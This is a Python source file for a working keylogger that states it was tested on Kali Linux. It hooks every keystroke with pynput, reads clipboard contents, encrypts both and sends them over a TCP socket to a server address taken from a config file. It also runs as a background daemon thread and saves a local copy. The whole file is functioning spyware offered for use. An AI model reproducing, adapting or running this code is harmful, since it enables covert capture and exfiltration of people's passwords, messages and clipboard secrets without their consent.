#!/usr/bin/python3

# _*_ coding: utf-8 _*_
# tested on linux (Linux kali 6.5.0-kali2-amd64)

import os
import threading
import socket
from pynput import keyboard
from pandas import read_clipboard
import logging
import json
from cryptography.fernet import Fernet

# Initialize logging
logging.basicConfig(filename='keylogger.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Load configuration
CONFIG_FILE = 'config.json'
if not os.path.exists(CONFIG_FILE):
    logging.error(f'Configuration file {CONFIG_FILE} not found.')
    exit(1)

with open(CONFIG_FILE, 'r') as file:
    config = json.load(file)

SERVER_ADDRESS = config.get('server_address', '127.0.0.1:53').split(':')
ENCRYPTION_KEY = config.get('encryption_key', None)

if not ENCRYPTION_KEY:
    logging.error('Encryption key not found in configuration.')
    exit(1)

cipher = Fernet(ENCRYPTION_KEY)


class Keylogger:
    def __init__(self):
        self.server_address = (SERVER_ADDRESS[0], int(SERVER_ADDRESS[1]))
        self.log_file = 'keylogger_output.txt'

    def keylogging(self):
        def on_key_press(key):
            try:
                # Connecting to server with a timeout
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
                    server.settimeout(10)  # Set timeout to 10 seconds
                    server.connect(self.server_address)
                    try:
                        # Clipboard data
                        data = str(read_clipboard().columns)
                        data = data.lstrip('Index([')
                        data = data.split("], dtype='object'")[0]
                        encrypted_data = cipher.encrypt(
                            f'Clipboard data: {data}\n'.encode())
                        server.send(encrypted_data)
                        # Print clipboard data
                        print(f'Clipboard data: {data}')
                        self.save_to_file(f'Clipboard data: {data}\n')
                    except Exception as e:
                        logging.error(f'Failed to fetch clipboard data: {e}')
                        server.send(cipher.encrypt(
                            b'Failed to fetch clipboard data\n'))

                    # Keystroke data
                    encrypted_key = cipher.encrypt(
                        f'Keystroke: {key}\n'.encode())
                    server.send(encrypted_key)
                    print(f'Keystroke: {key}')  # Print keystroke data
                    self.save_to_file(f'Keystroke: {key}\n')
            except Exception as e:
                logging.error(f'Error in on_key_press: {e}')

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()

    def save_to_file(self, data):
        with open(self.log_file, 'a') as file:
            file.write(data)


if __name__ == '__main__':
    try:
        # Creating an object
        obj = Keylogger()

        # Implementing threading and daemon = True (to run it in background)
        t1 = threading.Thread(target=obj.keylogging, daemon=True)
        t1.start()
        t1.join()
    except KeyboardInterrupt:
        logging.info('Keylogger terminated by user.')
    except Exception as e:
        logging.error(f'Unexpected error: {e}')
